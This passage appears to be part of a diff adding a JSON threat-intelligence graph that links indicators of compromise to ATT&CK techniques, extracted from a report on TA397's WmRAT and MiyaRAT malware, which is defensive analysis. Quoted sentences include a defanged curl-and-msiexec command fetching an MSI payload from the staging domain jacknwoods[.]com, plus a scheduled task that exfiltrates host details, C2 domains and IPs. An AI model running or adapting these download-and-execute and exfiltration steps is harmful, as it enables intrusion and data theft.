+        "node_text": "anvrsa.msi",
+        "edges": [
+          "EDGE_27"
+        ],
+        "sentence_indices": [
+          18
+        ],
+        "span_sentences": [
+          "This command downloads and runs the “anvrsa.msi” file on the target machine which installs the WmRAT file “anvrsa.exe”."
+        ]
+      },
+      {
+        "node_id": "IOC_402e745da628",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "academymusica[.]com",
+        "edges": [
+          "EDGE_28"
+        ],
+        "sentence_indices": [
+          25,
+          26,
+          40,
+          41
+        ],
+        "span_sentences": [
+          "The malware decrypts the C2 server address academymusica[.]com by taking each character from an encrypted blob and subtracting 0x25 from it.",
+          "Decrpytion of server address academymusica[.]com.",
+          "The jacknwoods[.]com domain acted as their staging domain to distribute WmRAT and MiyaRAT, and academymusica[.]com and samsnewlooker[.]com as C2 domains for each implant.",
+          "The WmRAT C2 academymusica[.]com resolved to 38.180.142[.]228 at the time of analysis, while theMiyaRAT C2 samsnewlooker[.]comresolved to 96.9.215[.]155."
+        ]
+      },
+      {
+        "node_id": "IOC_4c272d8a23b3",
+        "node_class": "ioc",
+        "node_type": "AESKey",
+        "node_text": "doobiedoodooziezzz",
+        "edges": [
+          "EDGE_29"
+        ],
+        "sentence_indices": [
+          33
+        ],
+        "span_sentences": [
+          "This domain is decoded by taking the encoded value and subtracting the matching character in the string “doobiedoodooziezzz” from it."
+        ]
+      },
+      {
+        "node_id": "IOC_59bd1292dae5",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\users\\public\\music\\gfxview.msi",
+        "edges": [
+          "EDGE_30"
+        ],
+        "sentence_indices": [
+          21
+        ],
+        "span_sentences": [
+          "Following that, Proofpoint researchers observed TA397 dropping another payload by downloading and running “gfxview.msi”:\ncurl -o C:\\users\\public\\music\\gfxview[.]msi http://jacknwoods[.]com/gfxview[.]msi msiexec /i C:\\users\\public\\music\\gfxview.msi /qn /norestart\nThis acted as the dropper to install “xrgtg.exe” which was the MiyaRAT payload."
+        ]
+      },
+      {
+        "node_id": "IOC_5b06a0ad7573",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "~tmp.pdf",
+        "edges": [
+          "EDGE_31"
+        ],
+        "sentence_indices": [
+          6,
+          10
+        ],
+        "span_sentences": [
+          "The email included a compressed archive (RAR) file attachment containing a decoy PDF (~tmp.pdf) file detailing a World Bank public initiative in Madagascar for infrastructure development, a shortcut (LNK) file masquerading as a PDF (PUBLIC INVESTMENTS PROJECTS 2025.pdf.lnk), and an Alternate Data Stream (ADS) file that contained PowerShell code.",
+          "Alongside the LNK file, was a “~tmp.pdf” file and two NTFS alternate data streams (ADS), one titled “Participation” and the other a “Zone.Identifier”."
+        ]
+      },
+      {
+        "node_id": "IOC_7564583b24ad",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\users\\public\\music\\gfxview[.]msi",
+        "edges": [
+          "EDGE_32"
+        ],
+        "sentence_indices": [
+          21
+        ],
+        "span_sentences": [
+          "Following that, Proofpoint researchers observed TA397 dropping another payload by downloading and running “gfxview.msi”:\ncurl -o C:\\users\\public\\music\\gfxview[.]msi http://jacknwoods[.]com/gfxview[.]msi msiexec /i C:\\users\\public\\music\\gfxview.msi /qn /norestart\nThis acted as the dropper to install “xrgtg.exe” which was the MiyaRAT payload."
+        ]
+      },
+      {
+        "node_id": "IOC_9101acdcb229",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "anvrsa.exe",
+        "edges": [
+          "EDGE_33"
+        ],
+        "sentence_indices": [
+          18
+        ],
+        "span_sentences": [
+          "This command downloads and runs the “anvrsa.msi” file on the target machine which installs the WmRAT file “anvrsa.exe”."
+        ]
+      },
+      {
+        "node_id": "IOC_ae9e2d549b84",
+        "node_class": "ioc",
+        "node_type": "IPAddress",
+        "node_text": "38.180.142[.]228",
+        "edges": [],
+        "sentence_indices": [
+          41
+        ],
+        "span_sentences": [
+          "The WmRAT C2 academymusica[.]com resolved to 38.180.142[.]228 at the time of analysis, while theMiyaRAT C2 samsnewlooker[.]comresolved to 96.9.215[.]155."
+        ]
+      },
+      {
+        "node_id": "IOC_bf855203ab13",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "microsoft[.]com",
+        "edges": [
+          "EDGE_34"
+        ],
+        "sentence_indices": [
+          28
+        ],
+        "span_sentences": [
+          "Assuming all the junk threads have started, the malware does a connectivity check by making a request to microsoft[.]com."
+        ]
+      },
+      {
+        "node_id": "IOC_ee237bd63ca8",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "jacknwoods[.]com",
+        "edges": [
+          "EDGE_35",
+          "EDGE_36",
+          "EDGE_37",
+          "EDGE_38",
+          "EDGE_39"
+        ],
+        "sentence_indices": [
+          12,
+          19,
+          21,
+          40
+        ],
+        "span_sentences": [
+          "This scheduled task attempted to send target host information (username and computer name) with the curl utility every 17 minutes to the domain jacknwoods[.]com.",
+          "This series of commands shows TA397 enumerating the ProgramData directory, listing currently running processes, and using the Windows command line utility (WMIC) to identify any antivirus products running on the target machine, and exfiltrating that data in a file to a different endpoint on the jacknwoods[.]com domain.",
+          "Following that, Proofpoint researchers observed TA397 dropping another payload by downloading and running “gfxview.msi”:\ncurl -o C:\\users\\public\\music\\gfxview[.]msi http://jacknwoods[.]com/gfxview[.]msi msiexec /i C:\\users\\public\\music\\gfxview.msi /qn /norestart\nThis acted as the dropper to install “xrgtg.exe” which was the MiyaRAT payload.",
+          "The jacknwoods[.]com domain acted as their staging domain to distribute WmRAT and MiyaRAT, and academymusica[.]com and samsnewlooker[.]com as C2 domains for each implant."
+        ]
+      },
+      {
+        "node_id": "IOC_fa822b2168c4",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "http://jacknwoods[.]com/gfxview[.]msi",
+        "edges": [
+          "EDGE_40"
+        ],
+        "sentence_indices": [
+          21
+        ],
+        "span_sentences": [
+          "Following that, Proofpoint researchers observed TA397 dropping another payload by downloading and running “gfxview.msi”:\ncurl -o C:\\users\\public\\music\\gfxview[.]msi http://jacknwoods[.]com/gfxview[.]msi msiexec /i C:\\users\\public\\music\\gfxview.msi /qn /norestart\nThis acted as the dropper to install “xrgtg.exe” which was the MiyaRAT payload."
+        ]
+      },
+      {
+        "node_id": "IOC_fd10eb2fb6b1",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "samsnewlooker[.]com",
+        "edges": [
+          "EDGE_41"
+        ],
+        "sentence_indices": [
+          34,
+          35,
+          40,
+          41
+        ],
+        "span_sentences": [
+          "Decoding C2 server samsnewlooker[.]com.",
+          "Doing this results in the C2 domain samsnewlooker[.]com.",
+          "The jacknwoods[.]com domain acted as their staging domain to distribute WmRAT and MiyaRAT, and academymusica[.]com and samsnewlooker[.]com as C2 domains for each implant.",
+          "The WmRAT C2 academymusica[.]com resolved to 38.180.142[.]228 at the time of analysis, while theMiyaRAT C2 samsnewlooker[.]comresolved to 96.9.215[.]155."
+        ]
+      }
+    ]
+  },
+  "edges": [
+    {
+      "edge_id": "EDGE_1",
+      "node_u": "HL_0f4e0fd9f1e0",
+      "node_v": "TTP_T1027"
+    },
+    {
+      "edge_id": "EDGE_2",
+      "node_u": "HL_0f4e0fd9f1e0",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_3",
+      "node_u": "HL_153928bf9609",
+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_4",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1027"
+    },
+    {
+      "edge_id": "EDGE_5",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1036"
+    },
+    {
+      "edge_id": "EDGE_6",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1041"
+    },
+    {
+      "edge_id": "EDGE_7",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1047"
+    },
+    {
+      "edge_id": "EDGE_8",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1053"
+    },
+    {
+      "edge_id": "EDGE_9",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1057"
+    },
+    {
+      "edge_id": "EDGE_10",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_11",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_12",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1082"
+    },
+    {
+      "edge_id": "EDGE_13",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1083"
+    },
+    {
+      "edge_id": "EDGE_14",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_15",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1204"
+    },
+    {
+      "edge_id": "EDGE_16",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1564"
+    },
+    {
+      "edge_id": "EDGE_17",
+      "node_u": "HL_5827ab97cb13",
+      "node_v": "TTP_T1566"
+    },
+    {
+      "edge_id": "EDGE_18",
+      "node_u": "HL_7aa4727bd97e",
+      "node_v": "TTP_T1027"
+    },
+    {
+      "edge_id": "EDGE_19",
+      "node_u": "HL_7aa4727bd97e",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_20",
+      "node_u": "HL_ab757af3e503",
+      "node_v": "TTP_T1047"
+    },
+    {
+      "edge_id": "EDGE_21",
+      "node_u": "HL_c6426a20d0e4",
+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_22",
+      "node_u": "HL_c6426a20d0e4",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_23",
+      "node_u": "IOC_0e91333e51f7",
+      "node_v": "TTP_T1036"
+    },
+    {
+      "edge_id": "EDGE_24",
+      "node_u": "IOC_0e91333e51f7",
+      "node_v": "TTP_T1204"
+    },
+    {
+      "edge_id": "EDGE_25",
+      "node_u": "IOC_0e91333e51f7",
+      "node_v": "TTP_T1564"
+    },
+    {
+      "edge_id": "EDGE_26",
+      "node_u": "IOC_19ebb6f6f523",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_27",
+      "node_u": "IOC_3270fb859d9a",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_28",
+      "node_u": "IOC_402e745da628",
+      "node_v": "TTP_T1027"
+    },
+    {
+      "edge_id": "EDGE_29",
+      "node_u": "IOC_4c272d8a23b3",
+      "node_v": "TTP_T1027"
+    },
+    {
+      "edge_id": "EDGE_30",
+      "node_u": "IOC_59bd1292dae5",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_31",
+      "node_u": "IOC_5b06a0ad7573",
+      "node_v": "TTP_T1564"
+    },
+    {
+      "edge_id": "EDGE_32",
+      "node_u": "IOC_7564583b24ad",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_33",
+      "node_u": "IOC_9101acdcb229",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_34",
+      "node_u": "IOC_bf855203ab13",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_35",
+      "node_u": "IOC_ee237bd63ca8",
+      "node_v": "TTP_T1041"
+    },
+    {
+      "edge_id": "EDGE_36",
+      "node_u": "IOC_ee237bd63ca8",
+      "node_v": "TTP_T1053"
+    },
+    {
+      "edge_id": "EDGE_37",
+      "node_u": "IOC_ee237bd63ca8",
+      "node_v": "TTP_T1059"
+    },
+    {
+      "edge_id": "EDGE_38",
+      "node_u": "IOC_ee237bd63ca8",
+      "node_v": "TTP_T1071"
+    },
+    {
+      "edge_id": "EDGE_39",
+      "node_u": "IOC_ee237bd63ca8",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_40",
+      "node_u": "IOC_fa822b2168c4",
+      "node_v": "TTP_T1105"
+    },
+    {
+      "edge_id": "EDGE_41",
+      "node_u": "IOC_fd10eb2fb6b1",
+      "node_v": "TTP_T1027"
+    }
+  ]
+}
